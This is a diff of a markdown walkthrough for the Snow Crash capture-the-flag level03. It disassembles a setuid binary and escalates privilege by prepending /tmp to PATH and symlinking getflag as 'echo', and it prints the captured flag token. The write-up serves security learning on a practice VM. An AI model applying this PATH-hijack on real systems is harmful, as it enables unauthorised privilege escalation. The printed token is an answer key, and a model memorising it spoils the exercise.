@@ -2,17 +2,31 @@
 
 ## Steps
 
-1. __Observation__ (Guest): when connecting as the `level03` user,
-    nothing appears on stdout.
-
-2. __Action__ (Guest): list the files present at the root
+1. __Action__ (Guest): list the files present at the root
     ```sh
-    ls -lA
+    ls -A
     ```
 
-3. __Observation__ (Guest): the previous command reveals an executable
+2. __Observation__ (Guest): the previous command reveals a `level03` file
+    ```
+    .bash_logout  .bashrc  level03  .profile
+    ```
+
+3. __Action__ (Guest): get more information on the file
     ```sh
-    -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
+    getfacl level03
+    ```
+
+4. __Observation__ (Guest): the previous command reveals the file is an
+    executable and has the `setuid` and the `setgid` bits enabled
+    ```
+    # file: level03
+    # owner: flag03
+    # group: level03
+    # flags: ss-
+    user::rwx
+    group::r-x
+    other::r-x
     ```
 
 4. __Action__ (Guest): execute the executable
@@ -23,10 +37,45 @@
 5. __Observation__ (Guest): the message `Exploit me` appears on stdout
 
 6. __Action__ (Guest): gather more information on the executable
-    running the program under `gdb` gives us nothing
+    Running the program under `gdb` gives us nothing
     but disassembling the main gives us useful information
+    ```
+    break main
+    run
+    disassemble
+    ```
 
 7. __Observation__ (Guest): a few fonctions are called in the main
+    ```
+    Dump of assembler code for function main:
+    0x080484a4 <+0>:	push   %ebp
+    0x080484a5 <+1>:	mov    %esp,%ebp
+    0x080484a7 <+3>:	and    $0xfffffff0,%esp
+    0x080484aa <+6>:	sub    $0x20,%esp
+    => 0x080484ad <+9>:	call   0x80483a0 <getegid@plt>
+    0x080484b2 <+14>:	mov    %eax,0x18(%esp)
+    0x080484b6 <+18>:	call   0x8048390 <geteuid@plt>
+    0x080484bb <+23>:	mov    %eax,0x1c(%esp)
+    0x080484bf <+27>:	mov    0x18(%esp),%eax
+    0x080484c3 <+31>:	mov    %eax,0x8(%esp)
+    0x080484c7 <+35>:	mov    0x18(%esp),%eax
+    0x080484cb <+39>:	mov    %eax,0x4(%esp)
+    0x080484cf <+43>:	mov    0x18(%esp),%eax
+    0x080484d3 <+47>:	mov    %eax,(%esp)
+    0x080484d6 <+50>:	call   0x80483e0 <setresgid@plt>
+    0x080484db <+55>:	mov    0x1c(%esp),%eax
+    0x080484df <+59>:	mov    %eax,0x8(%esp)
+    0x080484e3 <+63>:	mov    0x1c(%esp),%eax
+    0x080484e7 <+67>:	mov    %eax,0x4(%esp)
+    0x080484eb <+71>:	mov    0x1c(%esp),%eax
+    0x080484ef <+75>:	mov    %eax,(%esp)
+    0x080484f2 <+78>:	call   0x8048380 <setresuid@plt>
+    0x080484f7 <+83>:	movl   $0x80485e0,(%esp)
+    0x080484fe <+90>:	call   0x80483b0 <system@plt>
+    0x08048503 <+95>:	leave
+    0x08048504 <+96>:	ret
+    End of assembler dump.
+    ```
     - `getegid()` (returns the effective group ID of the calling process)
     - `geteuid()` (returns the effective user ID of the calling process)
     - `setresgid(gid_t rgid, gid_t egid, gid_t sgid)`
@@ -41,10 +90,13 @@
 8. __Action__ (Host): we copy the executable on our host machine
     to better manipulate it
     ```sh
-    scp -P 4242 level03@192.168.56.101:/home/user/level03/level03 level03_exec
+    sshpass -f snow-crash/level02/flag \
+    scp -P 4242 level03@192.168.56.101:/home/user/level03/level03 level03
+    docker cp snow-crash:level03 .
     ```
 
-9. __Action__ (Host): pass the executable to `dogbolt` to decompile it
+9. __Action__ (Host): pass the executable to [dogbolt](https://dogbolt.org/)
+    to decompile it
 
 10. __Observation__ (Host): a few things are to observe here
     ```c
@@ -66,34 +118,23 @@
     of both the user and group.
 
 11. __Observation__ (Guest): we need to run `getflag` when running `./level03`
-    as we'll have the same ID as `flag03` when we'll do it
+    as we'll have the same ID as `flag03` when we'll do it. this will be done
+    by creating a symbolic link between the `getflag` and the `echo` commands
 
-12. __Action__ (Guest): find the path to the `getflag` command
-    ```sh
-    which getflag
-    getflag: /bin/getflag
-    ```
-
-13. __Action__ (Guest): create a symbolic link between `getflag` and `echo`
-    using the paths already present in `PATH`
-    ```sh
-    echo $PATH
-    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
-    ```
-
-14. __Observation__ (Guest): it is not possible to create a symbolic link
-    between `getflag` and `echo` using the paths in `PATH`. we need to add
-    a new path to `PATH`.
-
-15. __Action__ (Guest): create a symbolic link between `getflag` and `echo`
+12. __Action__ (Guest): create a symbolic link between `getflag` and `echo`
     adding a new path in `PATH`
     ```sh
     export PATH=/tmp:$PATH
-    ln -s /bin/getflag /tmp/echo
+    ln -s $(which getflag) /tmp/echo
     ```
 
-16. __Action__ (Guest): execute `./level03` and collect the flag
+16. __Action__ (Guest): execute `./level03`
     ```sh
     ./level03
+    ```
+
+17. __Observation__ (Guest): the flag is displayed on stdout
+    ```
     Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
     ```
+    
